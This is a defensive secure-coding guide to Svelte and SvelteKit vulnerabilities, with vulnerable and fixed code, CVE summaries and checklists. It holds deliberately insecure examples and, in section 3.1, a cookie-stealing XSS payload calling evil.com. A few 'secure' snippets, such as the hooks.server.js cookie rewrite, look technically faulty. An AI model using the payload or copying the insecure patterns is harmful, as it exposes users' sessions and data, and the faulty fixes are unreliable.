# Svelte & SvelteKit Security Deep Dive

> **Category:** JavaScript / Svelte Security Knowledge Bank  
> **Focus:** SSR XSS, reactive statement injection, store exposure, endpoint auth bypass, form action validation, CSRF bypass, hooks.server.ts misconfiguration  
> **Severity:** High  
> **CWE:** CWE-79 (XSS), CWE-352 (CSRF), CWE-284 (Access Control), CWE-200 (Info Exposure), CWE-346 (CORS), CWE-807 (Untrusted Input), CWE-918 (SSRF)  
> **AI Generation Risk:** High  
> **Last Updated:** July 2026

---

## Overview

Svelte and SvelteKit have rapidly gained adoption among AI-assisted developers — Svelte's minimal boilerplate and SvelteKit's file-based routing make them attractive for rapid prototyping and AI code generation. However, Svelte's compile-time approach and SvelteKit's hybrid server/client architecture introduce unique security pitfalls that AI models frequently miss.

SvelteKit's CSRF bypass vulnerabilities (CVE-2023-29003, CVE-2023-29008) and Svelte's SSR XSS (CVE-2022-25875) demonstrate that even a framework designed for compile-time safety can have runtime gaps. This document covers both Svelte component-level security and SvelteKit application-level security.

---

## 1. Vulnerability Explanation — Svelte/SvelteKit Specific Risks

### 1.1 `{@html}` Rendering (Raw HTML XSS)

Svelte's `{@html}` tag outputs raw HTML without sanitization. Unlike Angular's implied security, Svelte exposes `{@html}` as a first-class templating feature that looks similar to regular expression interpolation `{}`. AI models frequently use `{@html}` to "fix" rendering issues where HTML tags appear as escaped text, without considering XSS implications.

```svelte
<!-- 💀 VULNERABLE — User content rendered as raw HTML -->
<script>
  let comment = $state('<img src=x onerror="alert(\'XSS\')">');
</script>
<p>{@html comment}</p>
```

### 1.2 Reactive Statement Injection

Svelte 5's `$state()`, `$derived()`, and `$effect()` runes expose reactive declarations. When reactive expressions are constructed from user input or URL parameters, AI-generated code can inadvertently create injection points:

```svelte
<!-- 💀 VULNERABLE — Dynamically constructed reactive statement -->
<script>
  let userRole = $state(''); // from URL param
  // AI generates dynamic evaluation
  $effect(() => {
    eval(`console.log('Role: ${userRole}')`); // Code injection
  });
</script>
```

### 1.3 Svelte Store Exposure

Svelte's writable stores are the reactive state management primitive. AI code commonly:

- Exports writable stores directly (not read-only), allowing any module to modify them
- Forgets to unsubscribe from stores in components, causing memory leaks
- Stores `localStorage` tokens in plain writable stores without encryption

```javascript
// 💀 VULNERABLE — Writable store exported directly
// stores.js
export const userStore = writable(null);
// Any imported module can call userStore.set() / userStore.update()

// ✅ SECURE — Export read-only
const _userStore = writable(null);
export const userStore = { subscribe: _userStore.subscribe };
```

### 1.4 SvelteKit Endpoint Auth Bypass

SvelteKit's `+server.js`/`+server.ts` files expose API endpoints. AI frequently generates endpoints without authentication checks, especially when multiple endpoints are generated at once:

```javascript
// 💀 VULNERABLE — No auth check in API endpoint
// src/routes/api/admin/+server.js
export async function GET({ url }) {
  const data = await db.getAllUsers(); // 💀 No auth!
  return json(data);
}
```

### 1.5 Form Actions Without Validation

SvelteKit's form actions (`+page.server.js`) provide a built-in form handling pattern. AI models commonly:

- Accept all form fields from `formData` without validation
- Use destructured `formData` fields directly in database queries
- Omit `ActionResult` error handling, leaving forms vulnerable to mass assignment

### 1.6 Server Load Functions Leaking Data

SvelteKit's `+page.server.js` `load` functions execute on the server but their return values are serialized and sent to the client. AI-generated load functions frequently:

- Return full database objects instead of selecting only needed fields
- Include password hashes or internal IDs in the response
- Call external APIs and forward the entire response without filtering

### 1.7 CSRF Protection Bypass

SvelteKit 1.x had two CSRF bypass CVEs (CVE-2023-29003, CVE-2023-29008) where the `Content-Type` header check could be circumvented. AI-generated SvelteKit apps on versions before 1.15.2 are vulnerable.

---

## 2. How AI Generates These Vulnerabilities

| Vulnerability Pattern | AI Prompt That Triggers It |
|---|---|
| `{@html}` with user input | "Display this HTML content correctly in Svelte" |
| Missing endpoint auth | "Create a SvelteKit API endpoint that returns users" |
| Unvalidated form actions | "Add a contact form with SvelteKit form actions" |
| Exposed stores | "Create a shared store for authentication state" |
| Load function data leak | "Fetch user data in the server load function" |
| No CSRF protection | "Create a SvelteKit app with form submission" |

---

## 3. Vulnerable Code Examples

### 3.1 Raw HTML Injection

```svelte
<!-- 💀 VULNERABLE -->
<script>
  let { params } = $props();
  let content = params.content; // User-controlled
</script>

<div class="article">
  {@html content}
  <!-- <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)"> -->
</div>
```

### 3.2 Endpoint Without Auth

```javascript
// 💀 VULNERABLE — src/routes/api/users/+server.js
import { json } from '@sveltejs/kit';

export async function GET({ url }) {
  const users = await prisma.user.findMany({
    select: { id: true, email: true, passwordHash: true } // 💀 Exposes password hash!
  });
  return json(users);
}
```

### 3.3 Unvalidated Form Action

```javascript
// 💀 VULNERABLE — src/routes/register/+page.server.js
export const actions = {
  default: async ({ request }) => {
    const data = await request.formData();
    const user = Object.fromEntries(data); // 💀 Mass assignment

    // AI uses all fields directly
    await db.user.create({ data: user });
    // Attacker adds: isAdmin=true to formData
  }
};
```

### 3.4 Missing CSRF Protection (SvelteKit < 1.15.2)

```javascript
// 💀 VULNERABLE — svelte.config.js (default config before fix)
const config = {
  kit: {
    // CSRF protection exists but can be bypassed
    // via text/plain content type (CVE-2023-29003)
    // or uppercase Content-Type (CVE-2023-29008)
  }
};
```

### 3.5 Server Load Function Leaking Secrets

```javascript
// 💀 VULNERABLE — src/routes/admin/+page.server.js
export async function load({ locals }) {
  const adminData = await db.admin.findUnique({
    where: { id: locals.user.id }
    // Returns: { id, email, passwordHash, secretKey, ... }
  });
  return { adminData }; // 💀 Sent to client entirely
}
```

---

## 4. Secure Code Fix

### 4.1 Safe HTML Rendering

```svelte
<!-- ✅ SECURE — Escape HTML, don't render raw user content -->
<script>
  import { escape } from 'svelte/internal'; // or use DOMPurify

  let userContent = $state(htmlInput);

  // Option 1: Escape HTML entirely
  let escapedContent = $derived(escape(userContent));

  // Option 2: Sanitize with DOMPurify (only for trusted HTML subsets)
  import DOMPurify from 'dompurify';
  let sanitizedContent = $derived(DOMPurify.sanitize(userContent));
</script>

<!-- Use regular interpolation (auto-escaped) -->
<p>{userContent}</p>

<!-- Or sanitized {@html} with explicit DOMPurify -->
<p>{@html sanitizedContent}</p>
```

### 4.2 Authenticated Endpoints

```javascript
// ✅ SECURE — src/routes/api/users/+server.js
import { json, error } from '@sveltejs/kit';

// Apply to ALL server endpoints
export async function GET({ locals, url }) {
  // Always check authentication
  if (!locals.user) {
    throw error(401, 'Authentication required');
  }

  // Check authorization
  if (locals.user.role !== 'admin') {
    throw error(403, 'Insufficient permissions');
  }

  // Only select needed fields — never expose passwordHash
  const users = await prisma.user.findMany({
    select: { id: true, name: true, email: true, createdAt: true }
  });

  return json(users);
}
```

### 4.3 Validated Form Actions

```javascript
// ✅ SECURE — src/routes/register/+page.server.js
import { fail } from '@sveltejs/kit';

export const actions = {
  default: async ({ request }) => {
    const data = await request.formData();
    const email = data.get('email');
    const password = data.get('password');
    const name = data.get('name');

    // Validate every field explicitly — NEVER use Object.fromEntries()
    if (!email || typeof email !== 'string') {
      return fail(400, { error: 'Email is required' });
    }
    if (!password || typeof password !== 'string' || password.length < 8) {
      return fail(400, { error: 'Password must be at least 8 characters' });
    }

    // Whitelist approach — only specific fields
    const user = await db.user.create({
      data: {
        email: email.toLowerCase().trim(),
        passwordHash: await hash(password),
        name: name?.toString().trim() || 'User',
        isAdmin: false // 💀 Never accept from form data
      }
    });

    return { success: true };
  }
};
```

### 4.4 CSRF Protection (SvelteKit 1.15.2+)

```javascript
// ✅ SECURE — svelte.config.js (updated)
const config = {
  kit: {
    csrf: {
      checkOrigin: true, // Enabled by default
      // Content-Type validation now includes text/plain
      // and case-insensitive header checking
    }
  }
};

// ✅ Also — Use SameSite=Strict/Lax for session cookies
// In hooks.server.js:
export const handle = async ({ event, resolve }) => {
  // Ensure SameSite is set
  const response = await resolve(event);
  response.headers['Set-Cookie'] = response.headers['Set-Cookie']
    ?.replace('SameSite=Lax', 'SameSite=Strict');
  return response;
};
```

### 4.5 Secure Server Load Functions

```javascript
// ✅ SECURE — src/routes/admin/+page.server.js
export async function load({ locals }) {
  if (!locals.user || locals.user.role !== 'admin') {
    throw redirect(303, '/login');
  }

  const adminData = await db.admin.findUnique({
    where: { id: locals.user.id },
    select: {
      // Explicit select — only fields needed on client
      id: true,
      name: true,
      email: true,
      lastLogin: true
      // 💀 passwordHash, secretKey omitted
    }
  });

  return { adminData };
}
```

### 4.6 Auth Guard in `hooks.server.js`

```javascript
// ✅ SECURE — src/hooks.server.js
import { redirect } from '@sveltejs/kit';

const protectedRoutes = ['/admin', '/dashboard', '/settings'];
const authRoutes = ['/login', '/register'];

export const handle = async ({ event, resolve }) => {
  const { url, locals, cookies } = event;

  // Set up session
  const session = cookies.get('session');
  locals.user = await getSessionUser(session); // Validate server-side

  // Protect routes
  if (protectedRoutes.some(p => url.pathname.startsWith(p))) {
    if (!locals.user) {
      throw redirect(303, '/login');
    }
  }

  // Redirect authenticated users away from auth pages
  if (authRoutes.some(p => url.pathname.startsWith(p))) {
    if (locals.user) {
      throw redirect(303, '/dashboard');
    }
  }

  const response = await resolve(event);

  // Security headers
  response.headers.set('X-Content-Type-Options', 'nosniff');
  response.headers.set('X-Frame-Options', 'DENY');
  response.headers.set('Content-Security-Policy',
    "script-src 'self'; object-src 'none'");

  return response;
};
```

---

## 5. Real CVEs (Verified via NVD)

### CVE-2022-25875 — XSS in Svelte SSR
- **Published:** 2022-07-12
- **CVSS:** 6.1 MEDIUM (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
- **CWE:** CWE-79 (Cross-site Scripting)
- **Affected:** Svelte < 3.49.0
- **Description:** During Server-Side Rendering (SSR), Svelte does not properly escape attribute values when objects with a custom `toString()` function are used. An attacker can craft an object that, when rendered during SSR, injects arbitrary HTML/JavaScript into the server-rendered HTML. This bypasses Svelte's compile-time escaping guarantees because the escaping happens at runtime during SSR.
- **Fix:** Upgrade to Svelte >= 3.49.0. The SSR attribute escaping was rewritten to properly handle `toString()` returns.
- **NVD Source:** https://nvd.nist.gov/vuln/detail/CVE-2022-25875

### CVE-2023-29003 — CSRF Bypass in SvelteKit
- **Published:** 2023-04-04
- **CVSS:** 8.8 HIGH (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)
- **CWE:** CWE-352 (Cross-Site Request Forgery)
- **Affected:** SvelteKit < 1.15.1
- **Description:** SvelteKit's built-in CSRF protection checks the `Content-Type` header to determine if a request is a form submission. The `is_form_content_type` function only checked for `application/x-www-form-urlencoded` and `multipart/form-data`. An attacker can submit a `POST` request with `text/plain` content type — which browsers allow cross-origin — bypassing CSRF protection entirely. SvelteKit 1.15.1 added `text/plain` to the check and extended CSRF validation to `PUT`, `PATCH`, and `DELETE` methods.
- **Fix:** Upgrade to SvelteKit >= 1.15.1.
- **NVD Source:** https://nvd.nist.gov/vuln/detail/CVE-2023-29003

### CVE-2023-29008 — CSRF Bypass via Uppercase Content-Type (SvelteKit)
- **Published:** 2023-04-06
- **CVSS:** 8.8 HIGH (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)
- **CWE:** CWE-352 (Cross-Site Request Forgery)
- **Affected:** SvelteKit < 1.15.2
- **Description:** SvelteKit's CSRF protection did a case-sensitive comparison of the `Content-Type` header. Browsers will not send an uppercase `Content-Type`, but a fetch-based attacker can set `Content-Type` to `TEXT/PLAIN` or `Application/X-WWW-FORM-URLENCODED`, which bypasses the case-sensitive check. SvelteKit 1.15.2 made the comparison case-insensitive.
- **Fix:** Upgrade to SvelteKit >= 1.15.2.
- **NVD Source:** https://nvd.nist.gov/vuln/detail/CVE-2023-29008

### CVE-2023-38687 — XSS in Svelecte (Svelte Component Library)
- **Published:** 2023-08-14
- **CVSS:** 5.4 MEDIUM (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
- **CWE:** CWE-79 (Cross-site Scripting)
- **Affected:** Svelecte < 3.16.3
- **Description:** Svelecte, a Svelte autocomplete/select component, renders item names as raw HTML without escaping. An attacker who can control the label of a selectable item can inject arbitrary HTML/JavaScript that executes when the dropdown is opened.
- **Fix:** Upgrade to Svelecte >= 3.16.3.
- **NVD Source:** https://nvd.nist.gov/vuln/detail/CVE-2023-38687

### CVE-2021-29261 — RCE in Svelte VS Code Extension
- **Published:** 2021-04-05
- **CVSS:** 7.8 HIGH (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)
- **CWE:** NVD-CWE-noinfo
- **Affected:** Svelte VS Code extension < 104.8.0
- **Description:** The unofficial Svelte language-tools extension for VS Code allowed arbitrary code execution via a crafted workspace configuration. Opening a malicious project could compromise the developer's machine.
- **Fix:** Upgrade to the official Svelte VS Code extension >= 104.8.0.
- **NVD Source:** https://nvd.nist.gov/vuln/detail/CVE-2021-29261

---

## 6. Prevention Checklist

- [ ] **Never use `{@html}` with user-controlled content** — always sanitize with DOMPurify first, or use regular `{}` interpolation.
- [ ] **Authenticate every `+server.js` endpoint** — check `locals.user` at the start of each handler.
- [ ] **Validate form actions explicitly** — avoid `Object.fromEntries(formData)`. Whitelist specific fields with validation.
- [ ] **Select only needed fields in load functions** — never return entire database objects to the client.
- [ ] **Keep SvelteKit up to date** — CSRF bypasses were fixed in 1.15.2; run the latest stable.
- [ ] **Export stores as read-only** — use `{ subscribe }` pattern, never export writable stores directly.
- [ ] **Use `hooks.server.js` for global auth** — centralize auth checks instead of repeating in every endpoint.
- [ ] **Set SameSite=Strict on session cookies** — prevents CSRF even if SvelteKit's CSRF check has a bypass.
- [ ] **Add Content-Security-Policy headers** — defense-in-depth against XSS injection.
- [ ] **Enable SvelteKit's built-in CSRF protection** — verify `csrf.checkOrigin: true` in config.
- [ ] **Validate URL params and query strings** — don't pass them directly to `load` functions or `form` actions.
- [ ] **Limit `load` function access** — check authorization for the specific resource, not just authentication.
- [ ] **Use `$page.url` with caution** — parse and validate searchParams before using.
- [ ] **Audit third-party Svelte components** — Svelecte and similar libraries may render raw HTML (CVE-2023-38687).
- [ ] **Unsubscribe from stores in `$effect`/`onDestroy`** — use `$destroy()` or cleanup functions.
- [ ] **Avoid `eval` or `new Function` in reactive statements** — never build expressions from user input.
- [ ] **Pin Svelte and SvelteKit versions** — subscribe to GitHub security advisories for both projects.

---

## 7. Vibe-Coding Red Flags (Svelte/SvelteKit-Specific)

- [ ] **`{@html}` used anywhere with non-static content** — Almost always a vulnerability with user input.
- [ ] **`+server.js` files without `locals.user` check** — Endpoint is publicly accessible.
- [ ] **`Object.fromEntries(formData)` in form actions** — Mass assignment vulnerability.
- [ ] **Empty `+page.server.js` load function returning `{}`** — Potential placeholder that should be restricted.
- [ ] **`export const user = writable(...)` (writable export)** — Any module can modify the store.
- [ ] **No `hooks.server.js` file** — No global auth or security header management.
- [ ] **Form action that accepts `isAdmin`, `role`, or similar privilege fields** — Privilege escalation vector.
- [ ] **Load function returning entire Prisma/fetch response** — Data leakage to client.
- [ ] **`$page.url.searchParams` used directly in API calls** — SSRF or parameter injection.
- [ ] **No CSRF config in `svelte.config.js`** — Defaults may be safe on latest, but older versions had bypasses.
- [ ] **`goto()` used with user-controlled URL** — Open redirect vulnerability.
- [ ] **`$effect()` or `$derived()` with string concatenation from user input** — Injection risk.
- [ ] **`FormData.append('role', 'user')` in form submission** — Client can modify to bypass server check.
- [ ] **Server endpoint that returns `passwordHash` or `salt`** — Credential exposure.
- [ ] **SvelteKit version < 1.15.2 in package.json** — Vulnerable to CSRF bypass (CVE-2023-29003, CVE-2023-29008).
- [ ] **Svelte version < 3.49.0** — Vulnerable to SSR XSS (CVE-2022-25875).
- [ ] **`event.request` used directly without validation** — Untrusted input enters server handlers.
- [ ] **Adapters (`@sveltejs/adapter-node`, `adapter-vercel`) used without security review** — Default configs may expose debug endpoints.

---

## References

- Svelte Security: https://svelte.dev/docs/security
- SvelteKit Security Best Practices: https://kit.svelte.dev/docs/security
- GitHub Svelte Security Advisories: https://github.com/sveltejs/svelte/security/advisories
- GitHub SvelteKit Security Advisories: https://github.com/sveltejs/kit/security/advisories
- NVD Svelte CVEs: https://nvd.nist.gov/vuln/search/results?query=svelte&search_type=all
- CVE-2022-25875: https://nvd.nist.gov/vuln/detail/CVE-2022-25875
- CVE-2023-29003: https://nvd.nist.gov/vuln/detail/CVE-2023-29003
- CVE-2023-29008: https://nvd.nist.gov/vuln/detail/CVE-2023-29008
- CVE-2023-38687: https://nvd.nist.gov/vuln/detail/CVE-2023-38687
- CVE-2021-29261: https://nvd.nist.gov/vuln/detail/CVE-2021-29261
- OWASP XSS Prevention Cheatsheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- PortSwigger SvelteKit CSRF Research: https://portswigger.net/research/sveltekit-csrf-bypass
